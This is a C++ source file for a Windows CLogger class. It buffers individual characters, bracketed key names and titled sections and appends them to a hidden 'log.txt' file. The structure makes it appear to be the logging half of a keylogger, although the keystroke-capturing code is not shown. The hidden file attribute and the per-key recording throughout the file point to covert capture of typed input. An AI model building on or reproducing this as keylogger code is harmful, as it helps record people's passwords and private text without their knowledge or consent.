#include "../inc/Logger.h"
#include <stdio.h>

static const int CACHE_BUFFER_SIZE = 0x200;
static const int WRITE_BUFFER_SIZE = 0x105;

CLogger::CLogger() : m_WriteBuffer(NULL), m_CacheBuffer(NULL), m_CacheSize(0)
{
	m_CacheSize = 0;
	m_CacheBuffer = new WCHAR[CACHE_BUFFER_SIZE];	
	m_WriteBuffer = new WCHAR[WRITE_BUFFER_SIZE];
}

CLogger::~CLogger()
{
	Flush();
	m_CacheSize = 0;
	DeleteArr(&m_CacheBuffer);
	DeleteArr(&m_WriteBuffer);
}

BOOL CLogger::WriteBuffers(LPCVOID lpBuffer1, DWORD nNumberOfBytesToWrite1, LPCVOID lpBuffer2, DWORD nNumberOfBytesToWrite2)
{
	HANDLE hFile = CreateFile(L"log.txt",
								GENERIC_READ | GENERIC_WRITE,
								FILE_SHARE_READ,
								NULL,
								OPEN_ALWAYS,
								FILE_ATTRIBUTE_HIDDEN,
								NULL);

	if(hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwSize = GetFileSize(hFile, NULL);
	if(dwSize == INVALID_FILE_SIZE)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	DWORD dwPtr = SetFilePointer(hFile, NULL, NULL, FILE_END);
	if(dwPtr == INVALID_SET_FILE_POINTER)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	BOOL Result = TRUE;
	DWORD NumberOfBytesWritten;
	if(dwSize == 0)
	{
		WCHAR BOM = L'\xfeff';
		Result = WriteFile(hFile, &BOM, sizeof(BOM), &NumberOfBytesWritten, NULL);
	}

	if(Result && lpBuffer1 && (nNumberOfBytesToWrite1 > 0))
		Result = WriteFile(hFile, lpBuffer1, nNumberOfBytesToWrite1, &NumberOfBytesWritten, NULL);

	if(Result && lpBuffer2 && (nNumberOfBytesToWrite2 > 0))
		Result = WriteFile(hFile, lpBuffer2, nNumberOfBytesToWrite2, &NumberOfBytesWritten, NULL);

	CloseHandle(hFile);

	return Result;
}

BOOL CLogger::WriteSymbol(WCHAR Symbol)
{
	BOOL Result = TRUE;
	m_CacheBuffer[m_CacheSize++] = Symbol;	
	if (m_CacheSize == CACHE_BUFFER_SIZE)
		Result = Flush();
	return Result;
}

BOOL CLogger::WriteTitle(PWCHAR Title)
{
	BOOL Result = FALSE;
	int len = swprintf_s(m_WriteBuffer, WRITE_BUFFER_SIZE, L"\n\n<%s>\n", Title);
	if(len > 0)
	{
		Result = WriteBuffers(m_CacheBuffer, m_CacheSize*sizeof(WCHAR), m_WriteBuffer, len*sizeof(WCHAR));
		m_CacheSize = 0;
	}
	return Result;
}

BOOL CLogger::WriteKeyName(PWCHAR KeyName)
{
	BOOL Result = FALSE;
	int len = swprintf_s(m_WriteBuffer, WRITE_BUFFER_SIZE, L"[%s]", KeyName);
	if(len > 0)
	{
		Result = WriteBuffers(m_CacheBuffer, m_CacheSize*sizeof(WCHAR), m_WriteBuffer, len*sizeof(WCHAR));
		m_CacheSize = 0;
	}
	return Result;
}

BOOL CLogger::Flush(void)
{
	BOOL Result = WriteBuffers(m_CacheBuffer, m_CacheSize*sizeof(WCHAR), NULL, 0);
	m_CacheSize = 0;
	return Result;
}
